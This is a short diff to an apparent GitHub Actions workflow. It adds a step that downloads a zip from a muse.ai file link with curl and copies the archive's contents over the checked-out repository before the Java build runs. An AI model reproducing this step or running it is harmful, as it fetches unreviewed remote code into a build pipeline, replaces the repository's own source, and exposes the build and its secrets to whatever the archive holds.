@@ -21,6 +21,12 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
+      - name: Download app source
+        run: |
+          curl -L -o /tmp/bmc.zip "https://muse.ai/files/1237082279498569/1110726644901967/grorgo6tpl87tbhcr73gd0cm/BMCTracker.zip"
+          unzip -o /tmp/bmc.zip -d /tmp/src
+          cp -r /tmp/src/bmc-tracker/. .
+
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
